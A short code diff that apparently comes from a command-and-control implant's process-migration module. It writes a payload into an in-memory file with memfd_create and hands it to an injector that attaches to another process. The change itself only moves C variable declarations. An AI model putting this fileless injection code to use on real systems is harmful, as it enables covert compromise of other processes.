@@ -37,13 +37,14 @@
 int migrate_init(c2_t *c2, pid_t migrate_pid, int buffer_len, unsigned char *buffer)
 {
     #ifdef LINUX
-    int fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
+    int fd;
+    char image[PATH_MAX];
+
+    fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
 
     if (fd >= 0)
     {
         write(fd, buffer, buffer_len);
-
-        char image[PATH_MAX];
         sprintf(image, "/proc/self/fd/%d", fd);
 
         migrate_inject(c2, migrate_pid, image);
@@ -57,7 +58,9 @@ int migrate_init(c2_t *c2, pid_t migrate_pid, int buffer_len, unsigned char *buf
 int migrate_inject(c2_t *c2, pid_t migrate_pid, char *image)
 {
     injector_t *injector;
-    void *handle = NULL;
+    void *handle;
+
+    handle = NULL;
 
     if (injector_attach(&injector, migrate_pid) != 0)
         return -1;
